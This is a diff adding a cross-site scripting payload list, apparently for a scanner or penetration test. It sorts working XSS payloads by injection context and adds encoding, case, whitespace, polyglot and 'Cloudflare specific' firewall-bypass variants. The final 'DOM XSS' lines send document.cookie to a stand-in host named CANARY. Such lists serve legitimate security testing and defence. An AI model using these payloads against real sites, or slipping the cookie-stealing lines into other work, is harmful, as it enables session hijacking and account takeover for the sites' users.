@@ -1,0 +1,84 @@
+# HTML context
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<body onpageshow=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<math><mtext></table><img src=x onerror=alert(1)>
+
+# Attribute break-out
+" onmouseover="alert(1)
+" autofocus onfocus="alert(1)
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><img src=x onerror=alert(1)>
+
+# JavaScript string break
+"-alert(1)-"
+";alert(1)//
+'-alert(1)-'
+';alert(1)//
+\";alert(1)//
+${alert(1)}
+
+# URL/href context
+javascript:alert(1)
+javascript:void(alert(1))
+
+# Encoded - HTML entities
+<img src=x onerror=&#97;lert(1)>
+<img src=x onerror=&#x61;lert(1)>
+<svg onload=&#97;lert(1)>
+
+# Encoded - Unicode
+<svg onload=alert(1)>
+<script>alert(1)</script>
+
+# Encoded - Base64
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# Case variation
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+<Svg OnLoad=alert(1)>
+
+# Whitespace tricks
+<img src=x onerror = alert(1)>
+<img/src=x/onerror=alert(1)>
+<img	src=x	onerror=alert(1)>
+
+# Alternative event handlers
+<img src=x onanimationstart=alert(1)>
+<body onpopstate=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x>
+
+# Tag substitution
+<svg><script>alert(1)</script>
+<iframe srcdoc="<script>alert(1)</script>">
+<object data="javascript:alert(1)">
+
+# Comment splitting
+<scr<!---->ipt>alert(1)</scr<!---->ipt>
+
+# Template literals
+alert`1`
+confirm`1`
+prompt`1`
+
+# Cloudflare specific
+<svg onload=confirm(1)>
+<svg onload=prompt(1)>
+<svg onload=alert(1)>
+<svg onload=(alert)(1)>
+<svg onload=alert(1)//
+
+# Polyglot
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed><img src=x onerror=alert(1)>
+
+# DOM XSS
+<img src=x onerror=fetch('https://CANARY/?c='+document.cookie)>
+<svg onload=fetch('https://CANARY/?c='+document.cookie)>
